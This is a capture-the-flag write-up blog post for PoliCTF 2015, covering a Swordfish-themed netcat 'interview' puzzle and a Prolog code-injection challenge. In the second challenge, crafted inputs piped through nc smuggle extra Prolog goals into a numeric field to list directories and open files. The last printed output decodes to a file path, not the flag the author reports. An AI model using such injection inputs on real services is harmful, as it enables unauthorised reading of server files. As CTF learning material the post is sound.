---
layout: post
title: "Poli CTF 2015"
published: false
---

#Poli CTF 2015

PoliCTF is a 48 hour, jeopardy style capture-the-flag competition that will be held both online and live for a restricted number of participants attending the DIMVA 2015 conference held in Milan (Italy). This is the first time I have competed in this CTF, and i'd like to say thank you to the team who put these challenges together!

This is the first CTF I have done in quite a while, so suffice to say I am currently out of practice and overthought many of the challenges. However I still had heaps of fun, and i'm looking forward to practicing for the next CTF!

http://polictf.it/

##Challenge Writeups


###GrabBag

####Hard Interview - 50 Points

This challenge was a great lesson in learning about not overthinking easy challenges!

So we start off with this:
>**interview.polictf.it:80**

Visit the address through your browser, and you'll receive a page that only displays the following text:
```
         ____                                     __                              __      
        /\  _`\                                  /\ \__                          /\ \__   
        \ \ \/\ \     __   _____      __     _ __\ \ ,_\   ___ ___      __    ___\ \ ,_\  
         \ \ \ \ \  /'__`\/\ '__`\  /'__`\  /\`'__\ \ \/ /' __` __`\  /'__`\/' _ `\ \ \/  
          \ \ \_\ \/\  __/\ \ \L\ \/\ \L\.\_\ \ \/ \ \ \_/\ \/\ \/\ \/\  __//\ \/\ \ \ \_ 
           \ \____/\ \____\\ \ ,__/\ \__/.\_\\ \_\  \ \__\ \_\ \_\ \_\ \____\ \_\ \_\ \__\
            \/___/  \/____/ \ \ \/  \/__/\/_/ \/_/   \/__/\/_/\/_/\/_/\/____/\/_/\/_/\/__/
                             \ \_\                                                        
                              \/_/                                                        
                     ___      ____               ___                                
                   /'___\    /\  _`\           /'___\                               
              ___ /\ \__/    \ \ \/\ \     __ /\ \__/   __    ___     ____     __   
             / __`\ \ ,__\    \ \ \ \ \  /'__`\ \ ,__\/'__`\/' _ `\  /',__\  /'__`\ 
            /\ \L\ \ \ \_/     \ \ \_\ \/\  __/\ \ \_/\  __//\ \/\ \/\__, `\/\  __/ 
            \ \____/\ \_\       \ \____/\ \____\\ \_\\ \____\ \_\ \_\/\____/\ \____\
             \/___/  \/_/        \/___/  \/____/ \/_/ \/____/\/_/\/_/\/___/  \/____/
                                                                            
                                                                            
____ ____ ____ ___ ____ _ ____ ___ ____ ___     ____ ____ ____ ____ ____ ____    ____ _  _ _    _   _ 
|__/ |___ [__   |  |__/ | |     |  |___ |  \    |__| |    |    |___ [__  [__     |  | |\ | |     \_/  
|  \ |___ ___]  |  |  \ | |___  |  |___ |__/    |  | |___ |___ |___ ___] ___]    |__| | \| |___   |   


fish@sword:~$  GET: command not found
fish@sword:~$  Host:: command not found
fish@sword:~$  Connection:: command not found
fish@sword:~$  Accept:: command not found
fish@sword:~$  User-Agent:: command not found
fish@sword:~$  Accept-Encoding:: command not found
fish@sword:~$  Accept-Language:: command not found
fish@sword:~$  
: command not found
fish@sword:~$ 
```
The browser's HTTP request being entered as commands is a fairly good indication that we need something more appropriate to access this system. [Netcat](https://en.wikipedia.org/wiki/Netcat) would handle connecting to port 80 nicely.
```
nc interview.polictf.it 80
```
Attempting any of the traditional bash commands will result in "command not found". 

```
fish@sword:~$ ls
 ls: command not found
```
After a slew of failed commands, the solution was much more simple - typing in "help" was surprisingly helpful!
```
fish@sword:~$ help
 A very hard interview: Codename Blow...Fish
Maybe you can help me with something...
DOD d-base, 128 bit encryption...What do you think?
Maybe slide in a Trojan hose hiding a worm...
I have been told that best "crackers" in the world can do it in 60 minutes, unfortunately I need someone who can do it in 60 seconds... naturally with the right incentives ;)
If you know what I mean, tell me how a real cracker accesses to a remote super protected server...

Possible commands:
hacker: Write code as a real hacker
help: Give information about the program
hint: Gives a little hint
exit: Loser...bye bye
ssh: A tiny ssh command
date: A very useful and innovative feature
```
The hacker command will literally print out "hacker" code to the screen [as if it was being typed by you](http://hackertyper.net/)! And the date command simply prints a date. Hint provides you with:
```
useage:  ssh username@address
address: a not so easily reachable IP address
Very simple...isn't it?
```
If you haven't picked it up already, this challenge is based around the interview scene in the movie [Swordfish](https://en.wikipedia.org/wiki/Swordfish_(film) . I brought up a video of the [interview scene](https://www.youtube.com/watch?v=zfy5dFhw3ik) on YouTube and watched it. After alot of pausing and squinting, I realised that there is an IP address that looks fairly out of place, and a frame that stood out to me.
```
fish@sword:~$ ssh admin@312.5.125.233
 flag{H4ll3_B3rry's_t0pl3ss_sc3n3_w4s_4ls0_n0t4bl3}
```
Success!
---

###Pwnable

####Hanoi as a Service - 50 Points

I really enjoyed this challenge as I learned alot from it. It was also the first time that I have encounted the programming language [Prolog](https://en.wikipedia.org/wiki/Prolog) as well techniques on how to approach these types of challenges.

>HANOI AS A SERVICE
>50 Points
>Check out our shiny new HaaS platform!
>nc haas.polictf.it 80

 When you netcat into the service you recieve the following message:
 
``` 
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
```
Lets enter the number 3.
```
3
* Move top disk from a to b
* Move top disk from a to b
* Move top disk from a to b
* Move top disk from a to b
* Move top disk from a to b
* Move top disk from a to b
* Move top disk from a to b
```
This would be a nifty service if we were looking to play [Tower of Hanoi](https://en.wikipedia.org/wiki/Tower_of_Hanoi), however we want to see how we can attack this service to find the flag.

Lets try some unexpected input, I entered the letter "w", which returned:
```
ERROR: Prolog initialisation failed:
ERROR: </2 Arithmetic: 'w/0' is not a function
```
Interesting! [Prolog](https://en.wikipedia.org/wiki/Prolog) is a general purpose logic programming language, a quick google search reveals a [handy list of commands](http://www.swi-prolog.org/pldoc/man?section=builtin) to try. Some of the unsuccessful approaches I tried were:
- Attempting to overflow the process by providing it with large input, however the code we dumped later showed that it had been coded to avoid processing input larger than 15 characters long.
- Certain commands, such as 'shell()' were rejected with a one of three random messages, such as "Nope.", "What are you trying to do!?!" and "Sorry thats not implemented!".

After some failed commands revealed the directory structure, this allowed me to focus my efforts on reaching the folders above, as it would likely be where the flag was hidden.
```
root@kali:~# nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
2), debug 2 ?- trace
ERROR: Prolog initialisation failed:
ERROR: Syntax error: Operator expected
ERROR: hanoi(2), debug 
ERROR: ** here **
ERROR: 2 ?- trace) . 
Exception in thread Thread-1 (most likely raised during interpreter shutdown):
Traceback (most recent call last):
  File "/usr/lib/python2.7/threading.py", line 810, in __bootstrap_inner
  File "/usr/lib/python2.7/threading.py", line 763, in run
  File "/home/ctf/haas/haas-proxy.py", line 36, in listen
  File "/usr/lib/python2.7/subprocess.py", line 796, in communicate
  File "/usr/lib/python2.7/subprocess.py", line 1376, in wait
  File "/usr/lib/python2.7/subprocess.py", line 476, in _eintr_retry_call
<type 'exceptions.OSError'>: [Errno 10] No child processes
```
The 'working_directory' command seemed like the best command to try here...
```
echo '2), working_directory(CWD, "/home/ctf/haas/"), ls %'|nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
* Move top disk from a to c
* Move top disk from a to b
* Move top disk from c to b
haas			haas-proxy.py			jhknsjdfhef_flag_here
```
This is fantastic - the flag is sitting right there in that folder! After much reading and trial and error, the final command was crafted:
```
echo '2), open("/home/ctf/haas/jhknsjdfhef_flag_here", read, Stream), read_line_to_codes(Stream,Codes), write(Codes) %'|nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
* Move top disk from a to c
* Move top disk from a to b
* Move top disk from c to b
ERROR: Prolog initialisation failed:
ERROR: open/3: source_sink '[47,104,111,109,101,47,99,116,102,47,104,97,97,115,47,106,104,107,110,115,106,100,114,104,101,102,95,102,108,97,103,95,104,101,114,101]' does not exist (No such file or directory)
```
After converting the flag from decimal to ascii the flag was revealed!
```
flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
```



---
